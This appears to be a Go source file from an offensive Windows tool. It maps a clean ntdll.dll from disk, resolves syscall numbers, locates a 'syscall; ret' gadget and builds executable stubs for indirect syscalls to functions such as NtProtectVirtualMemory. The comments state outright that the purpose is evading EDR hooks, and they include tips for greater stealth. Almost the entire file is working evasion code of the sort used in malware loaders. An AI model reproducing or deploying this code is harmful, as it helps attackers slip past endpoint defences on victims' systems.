//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

// ── Fresh ntdll Mapping & Indirect Syscalls ─────────────────────────────────
//
// EDR products hook ntdll.dll functions by inserting JMP trampolines at the
// start of each function. When we call NtProtectVirtualMemory, the call goes
// through the EDR hook first.
//
// This module solves the problem by:
//   1. Memory-mapping a clean copy of ntdll.dll from disk
//   2. Parsing its export table to find each function's Syscall Service Number (SSN)
//   3. Locating a "syscall; ret" gadget inside the clean mapping
//   4. Building executable stubs that set the SSN and JMP to that gadget
//
// Result: Our NT API calls execute through the clean copy's syscall instruction.
// The loaded (hooked) ntdll is never called and never modified.
//
// Detection context:
// - The loaded ntdll.dll is untouched → passes integrity checks
// - Stack traces show the syscall originating from our mapped section,
//   not from ntdll.dll → some EDRs may flag the unusual return address.
//   For maximum stealth, use the gadget address from the *loaded* ntdll
//   (after verifying the bytes at that offset are still "syscall; ret").

// ntSyscall represents a resolved NT syscall with its SSN and callable stub.
type ntSyscall struct {
	Name    string
	SSN     uint16
	StubPtr uintptr // pointer to our executable stub
}

// syscallTable holds resolved indirect syscall stubs.
var syscallTable = make(map[string]*ntSyscall)

// cleanNtdll holds the mapped clean ntdll image.
var cleanNtdll []byte
var cleanNtdllBase uintptr

// syscallGadget is the address of "syscall; ret" (0F 05 C3) in the clean mapping.
var syscallGadget uintptr

// ── PE Parsing Structures ───────────────────────────────────────────────────

type imageDosHeader struct {
	Magic    uint16
	_        [58]byte
	LfaNew   int32 // offset to PE header
}

type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type imageOptionalHeader64 struct {
	Magic                   uint16
	_                       [14]byte
	AddressOfEntryPoint     uint32
	_                       [8]byte
	ImageBase               uint64
	SectionAlignment        uint32
	FileAlignment           uint32
	_                       [16]byte
	SizeOfImage             uint32
	SizeOfHeaders           uint32
	_                       [4]byte
	Subsystem               uint16
	_                       [22]byte
	NumberOfRvaAndSizes     uint32
}

type imageDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type imageExportDirectory struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

type imageSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	_                    [12]byte
	Characteristics      uint32
}

// ── Map Clean ntdll From Disk ───────────────────────────────────────────────
// Reads ntdll.dll from System32 and maps it into memory.
// This gives us a pristine, unhook-free copy of ntdll.

func mapCleanNtdll() error {
	// Read from disk — this is the clean, unsigned copy
	sysDir := os.Getenv("SystemRoot")
	if sysDir == "" {
		sysDir = `C:\Windows`
	}
	ntdllPath := sysDir + `\System32\ntdll.dll`

	data, err := os.ReadFile(ntdllPath)
	if err != nil {
		return fmt.Errorf("read ntdll: %w", err)
	}

	// Validate DOS header
	if len(data) < 64 || binary.LittleEndian.Uint16(data[0:2]) != 0x5A4D {
		return fmt.Errorf("invalid DOS header")
	}

	peOffset := binary.LittleEndian.Uint32(data[60:64])
	if int(peOffset)+4 > len(data) {
		return fmt.Errorf("invalid PE offset")
	}

	// Validate PE signature
	if binary.LittleEndian.Uint32(data[peOffset:peOffset+4]) != 0x00004550 {
		return fmt.Errorf("invalid PE signature")
	}

	// Parse file header
	fileHdrOffset := peOffset + 4
	optHdrOffset := fileHdrOffset + 20 // sizeof(IMAGE_FILE_HEADER)

	// Parse optional header to get SizeOfImage
	sizeOfImage := binary.LittleEndian.Uint32(data[optHdrOffset+56 : optHdrOffset+60])

	// Allocate memory for the mapped image
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")

	baseAddr, _, err := virtualAlloc.Call(
		0,
		uintptr(sizeOfImage),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x04,   // PAGE_READWRITE
	)
	if baseAddr == 0 {
		return fmt.Errorf("VirtualAlloc failed: %v", err)
	}

	cleanNtdllBase = baseAddr

	// Copy headers
	sizeOfHeaders := binary.LittleEndian.Uint32(data[optHdrOffset+60 : optHdrOffset+64])
	copy(unsafe.Slice((*byte)(unsafe.Pointer(baseAddr)), sizeOfHeaders), data[:sizeOfHeaders])

	// Parse and copy sections
	numSections := binary.LittleEndian.Uint16(data[fileHdrOffset+2 : fileHdrOffset+4])
	sizeOfOptHdr := binary.LittleEndian.Uint16(data[fileHdrOffset+16 : fileHdrOffset+18])
	sectionOffset := optHdrOffset + uint32(sizeOfOptHdr)

	for i := uint16(0); i < numSections; i++ {
		secOff := sectionOffset + uint32(i)*40
		if int(secOff)+40 > len(data) {
			break
		}

		virtualAddr := binary.LittleEndian.Uint32(data[secOff+12 : secOff+16])
		sizeOfRawData := binary.LittleEndian.Uint32(data[secOff+16 : secOff+20])
		ptrToRawData := binary.LittleEndian.Uint32(data[secOff+20 : secOff+24])

		if sizeOfRawData == 0 || ptrToRawData == 0 {
			continue
		}

		if int(ptrToRawData+sizeOfRawData) > len(data) {
			sizeOfRawData = uint32(len(data)) - ptrToRawData
		}

		dst := unsafe.Slice((*byte)(unsafe.Pointer(baseAddr+uintptr(virtualAddr))), sizeOfRawData)
		copy(dst, data[ptrToRawData:ptrToRawData+sizeOfRawData])
	}

	cleanNtdll = data
	return nil
}

// ── Find the Syscall Gadget ─────────────────────────────────────────────────
// Searches the .text section of our clean ntdll mapping for "syscall; ret"
// (bytes: 0F 05 C3). This is the instruction we'll JMP to.

func findSyscallGadget() error {
	peOffset := binary.LittleEndian.Uint32(cleanNtdll[60:64])
	fileHdrOffset := peOffset + 4
	sizeOfOptHdr := binary.LittleEndian.Uint16(cleanNtdll[fileHdrOffset+16 : fileHdrOffset+18])
	optHdrOffset := fileHdrOffset + 20
	sectionOffset := optHdrOffset + uint32(sizeOfOptHdr)
	numSections := binary.LittleEndian.Uint16(cleanNtdll[fileHdrOffset+2 : fileHdrOffset+4])

	for i := uint16(0); i < numSections; i++ {
		secOff := sectionOffset + uint32(i)*40
		name := string(cleanNtdll[secOff : secOff+8])
		if !strings.HasPrefix(name, ".text") {
			continue
		}

		virtualAddr := binary.LittleEndian.Uint32(cleanNtdll[secOff+12 : secOff+16])
		virtualSize := binary.LittleEndian.Uint32(cleanNtdll[secOff+8 : secOff+12])

		textSection := unsafe.Slice(
			(*byte)(unsafe.Pointer(cleanNtdllBase+uintptr(virtualAddr))),
			virtualSize,
		)

		// Search for 0F 05 C3 (syscall; ret)
		for j := 0; j < len(textSection)-2; j++ {
			if textSection[j] == 0x0F && textSection[j+1] == 0x05 && textSection[j+2] == 0xC3 {
				syscallGadget = cleanNtdllBase + uintptr(virtualAddr) + uintptr(j)
				return nil
			}
		}
	}

	return fmt.Errorf("syscall gadget not found in .text section")
}

// ── Resolve SSN From Clean Export ────────────────────────────────────────────
// Reads the Syscall Service Number from a clean NT function stub.
// NT syscall stubs follow the pattern:
//   4C 8B D1        mov r10, rcx
//   B8 XX XX 00 00  mov eax, <SSN>
//   ...
//   0F 05           syscall
//   C3              ret

func resolveSSN(funcName string) (uint16, uintptr, error) {
	peOffset := binary.LittleEndian.Uint32(cleanNtdll[60:64])
	fileHdrOffset := peOffset + 4
	optHdrOffset := fileHdrOffset + 20

	// Export directory is the first data directory entry (offset 112 in optional header for x64)
	exportDirRVA := binary.LittleEndian.Uint32(cleanNtdll[optHdrOffset+112 : optHdrOffset+116])
	if exportDirRVA == 0 {
		return 0, 0, fmt.Errorf("no export directory")
	}

	exportDir := (*imageExportDirectory)(unsafe.Pointer(cleanNtdllBase + uintptr(exportDirRVA)))

	namesArr := cleanNtdllBase + uintptr(exportDir.AddressOfNames)
	ordinalsArr := cleanNtdllBase + uintptr(exportDir.AddressOfNameOrdinals)
	funcsArr := cleanNtdllBase + uintptr(exportDir.AddressOfFunctions)

	for i := uint32(0); i < exportDir.NumberOfNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(namesArr + uintptr(i*4)))
		name := goString((*byte)(unsafe.Pointer(cleanNtdllBase + uintptr(nameRVA))))

		if name != funcName {
			continue
		}

		ordinal := *(*uint16)(unsafe.Pointer(ordinalsArr + uintptr(i*2)))
		funcRVA := *(*uint32)(unsafe.Pointer(funcsArr + uintptr(uint32(ordinal)*4)))
		funcAddr := cleanNtdllBase + uintptr(funcRVA)

		// Read the function stub to extract the SSN
		// Expected pattern: 4C 8B D1 B8 XX XX 00 00
		stub := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 24)

		// Check for mov r10, rcx (4C 8B D1)
		if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
			// Check for mov eax, imm32 (B8 XX XX 00 00)
			if stub[3] == 0xB8 {
				ssn := binary.LittleEndian.Uint16(stub[4:6])
				return ssn, funcAddr, nil
			}
		}

		// Halo's Gate fallback — if the stub is hooked (JMP/INT3),
		// search neighboring functions to infer the SSN.
		// Nt functions are typically ordered by SSN in ntdll's export table.
		// But since we're using a clean disk copy, this shouldn't be needed.
		return 0, 0, fmt.Errorf("unexpected stub format for %s: %x", funcName, stub[:8])
	}

	return 0, 0, fmt.Errorf("function %s not found in exports", funcName)
}

// goString converts a null-terminated C string to a Go string.
func goString(p *byte) string {
	if p == nil {
		return ""
	}
	var buf []byte
	for ptr := uintptr(unsafe.Pointer(p)); ; ptr++ {
		b := *(*byte)(unsafe.Pointer(ptr))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

// ── Build Indirect Syscall Stub ─────────────────────────────────────────────
// Creates an executable code stub in memory:
//   mov r10, rcx          ; 4C 8B D1
//   mov eax, <SSN>        ; B8 XX XX 00 00
//   jmp <syscall_gadget>  ; FF 25 00 00 00 00 <addr8>
//
// The JMP target is the "syscall; ret" inside our clean ntdll mapping.
// This means:
//   - The SSN is from the clean copy (correct, not tampered)
//   - The syscall instruction runs from within our clean mapping
//   - The hooked ntdll is never called

func buildStub(ssn uint16) (uintptr, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")

	// Stub: mov r10,rcx; mov eax,SSN; jmp [rip]; <gadget_addr>
	// Total: 3 + 5 + 6 + 8 = 22 bytes
	stubSize := uintptr(32) // padded

	stubMem, _, err := virtualAlloc.Call(
		0,
		stubSize,
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)
	if stubMem == 0 {
		return 0, fmt.Errorf("alloc stub: %v", err)
	}

	stub := unsafe.Slice((*byte)(unsafe.Pointer(stubMem)), 32)

	// mov r10, rcx
	stub[0] = 0x4C
	stub[1] = 0x8B
	stub[2] = 0xD1

	// mov eax, <SSN>
	stub[3] = 0xB8
	binary.LittleEndian.PutUint16(stub[4:6], ssn)
	stub[6] = 0x00
	stub[7] = 0x00

	// jmp [rip+0] — indirect jump to the address stored immediately after
	stub[8] = 0xFF
	stub[9] = 0x25
	stub[10] = 0x00
	stub[11] = 0x00
	stub[12] = 0x00
	stub[13] = 0x00

	// 8-byte absolute address of the syscall gadget
	binary.LittleEndian.PutUint64(stub[14:22], uint64(syscallGadget))

	return stubMem, nil
}

// ── Public API: Initialize Indirect Syscalls ────────────────────────────────

// initIndirectSyscalls maps a clean ntdll and resolves the NT functions
// we need for evasion. Call this once at startup.
func initIndirectSyscalls() error {
	if err := mapCleanNtdll(); err != nil {
		return fmt.Errorf("map ntdll: %w", err)
	}

	if err := findSyscallGadget(); err != nil {
		return fmt.Errorf("find gadget: %w", err)
	}

	// Resolve the functions we need
	functions := []string{
		"NtProtectVirtualMemory",
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtFreeVirtualMemory",
		"NtQueryInformationProcess",
	}

	for _, fn := range functions {
		ssn, _, err := resolveSSN(fn)
		if err != nil {
			// Non-fatal — some functions may not be needed
			continue
		}

		stubPtr, err := buildStub(ssn)
		if err != nil {
			continue
		}

		syscallTable[fn] = &ntSyscall{
			Name:    fn,
			SSN:     ssn,
			StubPtr: stubPtr,
		}
	}

	return nil
}

// indirectSyscall calls an NT function via its indirect syscall stub.
// Falls back to direct syscall.SyscallN if the stub isn't available.
func indirectSyscall(name string, args ...uintptr) (uintptr, error) {
	if sc, ok := syscallTable[name]; ok {
		r1, _, errno := syscall.SyscallN(sc.StubPtr, args...)
		if errno != 0 {
			return r1, fmt.Errorf("syscall %s: NTSTATUS 0x%x", name, r1)
		}
		return r1, nil
	}
	return 0, fmt.Errorf("no stub for %s", name)
}

// ntProtectVirtualMemory wraps NtProtectVirtualMemory via indirect syscall.
// Signature: NtProtectVirtualMemory(ProcessHandle, BaseAddress*, RegionSize*, NewProtect, OldProtect*)
func ntProtectVirtualMemory(processHandle uintptr, baseAddr *uintptr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) error {
	r1, err := indirectSyscall(
		"NtProtectVirtualMemory",
		processHandle,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)
	if err != nil && r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%x", r1)
	}
	return nil
}
